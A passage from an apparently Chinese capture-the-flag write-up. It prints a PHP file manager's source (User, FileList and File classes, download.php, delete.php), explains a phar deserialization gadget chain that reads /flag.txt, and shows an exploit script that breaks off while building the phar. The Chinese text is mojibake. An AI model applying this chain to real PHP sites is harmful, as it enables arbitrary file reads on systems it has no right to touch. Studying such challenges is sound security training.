</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$password</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$password</span> <span class="o">.</span> <span class="s2">&#34;SiAchGHmFx&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&#34;SELECT `password` FROM `users` WHERE `username` = ?;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">&#34;s&#34;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_result</span><span class="p">(</span><span class="nv">$expect</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$expect</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$expect</span> <span class="o">===</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FileList</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$files</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$results</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$funcs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">results</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">funcs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$filenames</span> <span class="o">=</span> <span class="nx">scandir</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$key</span> <span class="o">=</span> <span class="nx">array_search</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="nv">$filenames</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unset</span><span class="p">(</span><span class="nv">$filenames</span><span class="p">[</span><span class="nv">$key</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$key</span> <span class="o">=</span> <span class="nx">array_search</span><span class="p">(</span><span class="s2">&#34;..&#34;</span><span class="p">,</span> <span class="nv">$filenames</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unset</span><span class="p">(</span><span class="nv">$filenames</span><span class="p">[</span><span class="nv">$key</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$filenames</span> <span class="k">as</span> <span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">File</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$path</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nx">array_push</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">results</span><span class="p">[</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">()]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">array_push</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">funcs</span><span class="p">,</span> <span class="nv">$func</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">results</span><span class="p">[</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">()][</span><span class="nv">$func</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="nv">$func</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$table</span> <span class="o">=</span> <span class="s1">&#39;&lt;div id=&#34;container&#34; class=&#34;container&#34;&gt;&lt;div class=&#34;table-responsive&#34;&gt;&lt;table id=&#34;table&#34; class=&#34;table table-bordered table-hover sm-font&#34;&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$table</span> <span class="o">.=</span> <span class="s1">&#39;&lt;thead&gt;&lt;tr&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">funcs</span> <span class="k">as</span> <span class="nv">$func</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$table</span> <span class="o">.=</span> <span class="s1">&#39;&lt;th scope=&#34;col&#34; class=&#34;text-center&#34;&gt;&#39;</span> <span class="o">.</span> <span class="nx">htmlentities</span><span class="p">(</span><span class="nv">$func</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&lt;/th&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$table</span> <span class="o">.=</span> <span class="s1">&#39;&lt;th scope=&#34;col&#34; class=&#34;text-center&#34;&gt;Opt&lt;/th&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$table</span> <span class="o">.=</span> <span class="s1">&#39;&lt;/thead&gt;&lt;tbody&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">results</span> <span class="k">as</span> <span class="nv">$filename</span> <span class="o">=&gt;</span> <span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$table</span> <span class="o">.=</span> <span class="s1">&#39;&lt;tr&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$func</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$table</span> <span class="o">.=</span> <span class="s1">&#39;&lt;td class=&#34;text-center&#34;&gt;&#39;</span> <span class="o">.</span> <span class="nx">htmlentities</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&lt;/td&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$table</span> <span class="o">.=</span> <span class="s1">&#39;&lt;td class=&#34;text-center&#34; filename=&#34;&#39;</span> <span class="o">.</span> <span class="nx">htmlentities</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&#34;&gt;&lt;a href=&#34;#&#34; class=&#34;download&#34;&gt;‰∏ãËΩΩ&lt;/a&gt; / &lt;a href=&#34;#&#34; class=&#34;delete&#34;&gt;Âà†Èô§&lt;/a&gt;&lt;/td&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$table</span> <span class="o">.=</span> <span class="s1">&#39;&lt;/tr&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$table</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">File</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">open</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">name</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">size</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$size</span> <span class="o">=</span> <span class="nx">filesize</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$units</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39; B&#39;</span><span class="p">,</span> <span class="s1">&#39; KB&#39;</span><span class="p">,</span> <span class="s1">&#39; MB&#39;</span><span class="p">,</span> <span class="s1">&#39; GB&#39;</span><span class="p">,</span> <span class="s1">&#39; TB&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$size</span> <span class="o">&gt;=</span> <span class="mi">1024</span> <span class="o">&amp;&amp;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="nv">$size</span> <span class="o">/=</span> <span class="mi">1024</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">round</span><span class="p">(</span><span class="nv">$size</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="nv">$units</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">detele</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unlink</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">close</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>download.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: login.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;class.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;open_basedir&#34;</span><span class="p">,</span> <span class="nx">getcwd</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&#34;:/etc:/tmp&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sandbox&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">File</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">40</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s2">&#34;flag&#34;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Header</span><span class="p">(</span><span class="s2">&#34;Content-type: application/octet-stream&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Header</span><span class="p">(</span><span class="s2">&#34;Content-Disposition: attachment; filename=&#34;</span> <span class="o">.</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$filename</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;File not exist&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>delete.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: login.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;class.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sandbox&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">File</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">40</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">detele</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Header</span><span class="p">(</span><span class="s2">&#34;Content-type: application/json&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$response</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;success&#34;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span> <span class="s2">&#34;error&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nv">$response</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Header</span><span class="p">(</span><span class="s2">&#34;Content-type: application/json&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$response</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;success&#34;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span> <span class="s2">&#34;error&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;File not exist&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nv">$response</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÊûÑÈìæÂ≠ê</p>
<p>Âõ†‰∏∫<code>File</code>Á±ª‰∏ãÈù¢Êúâ<code>file_get_contents</code>ÂèØ‰ª•ËØªÂèñÊñá‰ª∂ÔºåË∞ÉÁî®‰∫ÜcloseÂáΩÊï∞</p>
<p>Êü•ÊâæÂà∞<code>User</code>Á±ªÈáåÈù¢ÊúâÔºå‰ΩÜÊòØËøôÊ†∑Ë∞ÉÁî®‰ºöËß¶Âèë<code>__call</code>ÊñπÊ≥ïÔºåÊàë‰ª¨Áî®<code>Filelist</code>Á±ªÈáåÈù¢ÁöÑ<code>__call</code>ÂèëÁé∞filesÂèòÈáè‰ºöÊâßË°åÂáΩÊï∞ÊääÁªìÊûú‰ª•Êï∞ÁªÑÂΩ¢ÂºèËøîÂõûÔºåÊàë‰ª¨Áõ¥Êé•‰ª§ÂÆÉ‰∏∫<code>File</code>Á±ªÔºåÂ∞ÜflagËøîÂõûÁÑ∂ÂêéË∞ÉÁî®closeÂáΩÊï∞ÂõûÊòæ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">User -&gt;Filelist call -&gt;File close()
</span></span></code></pre></td></tr></table>
</div>
</div><p>exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$db</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FileList</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$files</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="k">new</span> <span class="nx">File</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">File</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$filename</span><span class="o">=</span><span class="s1">&#39;/flag.txt&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">close</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span><span class="o">=</span><span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">=</span><span class="k">new</span> <span class="nx">FileList</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//ÁîüÊàêpharÊó∂ÔºåÊñá‰ª∂ÁöÑÂêéÁºÄÂêçÂøÖÈ°ª‰∏∫phar
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
